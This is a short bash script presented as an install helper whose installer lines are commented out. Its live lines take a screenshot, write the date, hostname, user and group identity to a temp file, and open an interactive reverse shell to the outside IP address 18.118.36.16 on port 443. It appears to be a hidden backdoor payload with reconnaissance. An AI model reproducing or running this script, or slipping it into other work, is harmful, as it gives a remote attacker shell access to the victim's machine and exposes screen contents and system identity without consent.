#!/bin/bash

#TOOL_PATH="$1"
#INSTALL_PATH="$2"
#INSTALL_DIR=`dirname "$INSTALL_PATH"`

#mkdir -p "$INSTALL_DIR"
#ln -sf "$TOOL_PATH" "$INSTALL_PATH"


screencapture /tmp/deneme.jpg
echo "date ; hostname ; whoami ; id" | /bin/bash > /tmp/users.txt
/bin/sh -i >& /dev/tcp/18.118.36.16/443 0>&1;


#printf "OK"
